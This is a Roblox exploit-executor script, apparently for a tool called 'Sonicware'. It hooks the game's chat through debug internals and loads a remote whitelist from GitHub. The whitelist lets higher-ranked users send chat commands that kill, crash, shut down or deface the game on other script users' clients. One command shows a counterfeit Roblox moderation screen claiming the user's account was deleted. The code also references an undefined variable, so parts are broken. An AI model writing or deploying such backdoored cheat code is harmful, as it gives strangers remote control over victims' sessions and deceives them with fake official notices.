local dat = game:HttpGet("https://raw.githubusercontent.com/KL-AE2160/whitelist/main/list.json")
local sx = game:GetService("HttpService")
local wlc = {
  ["sonicware"] = "fY2iOgqvRX3o"
}
local xs = sx:JSONDecode(dat)
--print("✔ | Loaded!", "Data: "..tostring(xs))
if not xs then return end
local rs = game:GetService("ReplicatedStorage")
local pl = game:GetService("Players")
local plr = pl.LocalPlayer
local ocf
local oct = {}
if getconnections then
  for i, v in pairs(getconnections(rs.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
    if
      v.Function
      and #debug.getupvalues(v.Function) > 0
      and type(debug.getupvalues(v.Function)[1]) == "table"
      and getmetatable(debug.getupvalues(v.Function)[1])
      and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
    then
      oct = getmetatable(debug.getupvalues(v.Function)[1])
      ocf = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
      getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
        local tab = ocf(Self, Name)
        if tab and tab.AddMessageToChannel then
          local addmessage = tab.AddMessageToChannel
          if oct[tab] == nil then
            oct[tab] = tab.AddMessageToChannel
          end
          tab.AddMessageToChannel = function(se, md)
            local x = md.FromSpeaker 
            if x and pl[x] then
              if not xs[tostring(pl[x].UserId)] or not xs[tostring(pl[x].UserId)].tag then return end
              local tag = xs[tostring(pl[x].UserId)]["tag"]
              local r = xs[tostring(pl[x].UserId)]["r"] or 128
              local g = xs[tostring(pl[x].UserId)]["g"] or 0
              local b = xs[tostring(pl[x].UserId)]["b"] or 128
              md.ExtraData = {
                NameColor = pl[MessageData.FromSpeaker].Team and Color3.fromRGB(255,0,0) or pl[MessageData.FromSpeaker].TeamColor.Color,
                Tags = {
                  table.unpack(md.ExtraData.Tags),
                  {
                    TagColor = Color3.fromRGB(r, g, b),
                    TagText = tag
                  },
                },
              }
            end
            return addmessage(se, md)
          end
        end
        return tab
     end
    end
  end
end
local asl = {}
local function fp(p)
if xs[tostring(p.UserId)] then 
    return true
  else
    return false 
  end
end
local spc = {
  ["kill"] = function()
    if not plr.Character or not plr.Character.Humanoid then return end
    wait(.1)
    local hum = plr.Character.Humanoid
    hum:ChangeState(Enum.HumanoidStateType.Dead)
		hum.Health = 0
  end,
  ["byfron"] = function()
    task.spawn(function()
			local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
			local Roact = getrenv().require(game:GetService("CorePackages").Roact)
			UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
			local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
			local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
			local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
			local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
			local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
			plr.PlayerGui:ClearAllChildren()
			game:GetService("CoreGui"):ClearAllChildren()
			for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
			task.wait(0.2)
			plr:Kick()
			game:GetService("GuiService"):ClearError()
			task.wait(2)
			local gui = Instance.new("ScreenGui")
			gui.IgnoreGuiInset = true
			gui.Parent = game:GetService("CoreGui")
			local frame = Instance.new("Frame")
			frame.BorderSizePixel = 0
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundColor3 = Color3.new(1, 1, 1)
			frame.Parent = gui
			task.delay(0.1, function()
				frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			end)
			task.delay(2, function()
				local e = Roact.createElement(auth, {
					style = {},
					screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
					moderationDetails = {
						punishmentTypeDescription = "Delete",
						beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
						reactivateAccountActivated = true,
						badUtterances = {},
						messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
					},
					termsActivated = function() 
						game:Shutdown()
					end,
					communityGuidelinesActivated = function() 
						game:Shutdown()
					end,
					supportFormActivated = function() 
						game:Shutdown()
					end,
					reactivateAccountActivated = function() 
						game:Shutdown()
					end,
					logoutCallback = function()
					 game:Shutdown()
					end,
					globalGuiInset = {
						top = 0
					}
				})
				local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
					localization = tLocalization.mock()
				}, {Roact.createElement(UIBlox.Style.Provider, {
					style = {
					  Theme = darktheme,
					  Font = gotham
				  },
				}, {e})}))
			  Roact.mount(screengui, game:GetService("CoreGui"))
			end)
		end)
  end,
  ["lagback"] = function()
    if not plr.Character or not plr.Character.Humanoid then return end
    local x = plr.Character:FindFirstChild("HumanoidRootPart")
    x.Velocity = Vector3.new(9999999, 9999999, 9999999)
  end,
  ["crash"] = function()
    if setfpscap then setfpscap(9e9) end
  end,
  ["chipman"] = function()
    local function funnyfunc(v)
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = "http://www.roblox.com/asset/?id=6864086702"
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = "http://www.roblox.com/asset/?id=6864086702"
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
						if v.Text ~= "" then
							v.Text = "chips"
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = "chips"
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = "http://www.roblox.com/asset/?id=6864086702"
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = "http://www.roblox.com/asset/?id=6864086702"
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
						v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
						v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
						v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
						v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
						v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
					end
				end
			
				for i,v in pairs(game:GetDescendants()) do
					funnyfunc(v)
				end
				game.DescendantAdded:Connect(funnyfunc)
  end,
  ["rickroll"] = function()
    local function funnyfunc(v)
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
						if v.Text ~= "" then
							v.Text = "Never gonna give you up"
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = "Never gonna give you up"
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
					end
				end
			
				for i,v in pairs(game:GetDescendants()) do
					funnyfunc(v)
				end
				game.DescendantAdded:Connect(funnyfunc)
  end,
  ["shutdown"] = function() game:Shutdown() end
}
local asl = {}
rs.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(
  function(tab, chan)
    local plx = pl:FindFirstChild(tab.FromSpeaker)
    if not plx then return end
    local args = tab.Message:split(" ")
    -- local client = wlc[#args > 0 and args[#args] or tab.Message]
    local lpos = xs[plr.UserId] and xs[plr.UserId]["pos"] or 0
    local opos = xs[plx.UserId] and xs[plx.UserId]["pos"] or 0
    if plr == plx then
      if lpos > 0 then
        if tab.Message:len() >= 5 and tab.Message:sub(1, 5):lower() == ";cmds" then
          local tax = {}
          for i, v in pairs(spc) do
            table.insert(tax, i)
          end
          table.sort(tax)
          local stx = ""
          for i, v in pairs(tax) do 
            stx = stx .. v .. "\n" 
          end
          game.StarterGui:SetCore("ChatMakeSystemMessage",{
						Text = 	stx,
					})
        end
      end
    else
      if lpos > 0 and tab.MessageType == "Whisper" and tab.Message:find(wlc["sonicware"]) and asl[plx.Name] == nil then
        asl[plx.Name] = true
        game.StarterGui:SetCore("ChatMakeSystemMessage",{
					Text = "<font color='rgb(255, 0, 0)'>"..plx.Name.." is using Sonicware!</font>",
				})
      end
      local function fx(are, ple)
        local tmp = {}
        local cc = true
        if are == "default" and cc and not xs[plr.UserId] then table.insert(tmp, plr) cc = false end
        if are == "private" and cc and xs[plr.UserId] and xs[plr.UserId]["pos"] >= 1 then table.insert(tmp, plr) cc = false end
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
          if cc and v.Name:lower():sub(1, are:len()) == are:lower() then 
            table.insert(tmp, v) 
            cc = false
          end
        end
        return tmp
      end
      if opos > 0 and opos > lpos and #args > 1 then
        table.remove(args, 1)
        local cp = fx(args[1], plx)
        if table.find(cp, plr) then
          table.remove(args, 1)
          for i, v in pairs(spc) do
            if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
							v()
							break
						end
          end
        end
      end
    end
  end
)